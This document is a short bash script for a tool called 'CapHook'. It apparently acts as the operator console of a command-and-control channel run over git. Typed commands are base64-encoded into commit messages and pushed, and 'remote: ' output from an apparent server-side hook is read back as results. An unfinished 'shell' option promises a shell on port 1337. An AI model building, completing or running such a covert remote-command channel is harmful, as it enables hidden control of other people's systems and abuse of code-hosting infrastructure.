#!/bin/bash

execute () {
	encode=$(echo $1 | base64)
	echo ${encode}
    	touch $(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
	git add . > /dev/null
    	git commit -m ${encode} > /dev/null
    	#This is the best I could come up with
    	# I think I figured it out
    	git push &> /tmp/git
    	grep "remote: " /tmp/git | awk '{$1="";print}'
}

while true; do
    echo "CapHook> "
    read command
    if [ $command = "clear" ]
    then
    	clear
    elif [ $command = "shell" ]
	then
	    # gather ip
	    echo "spawing a shell on port 1337"
	    # write a fucntion 
    elif [ $command = "exit" ]
	then
	   exit
    else
	execute $command
     fi
done
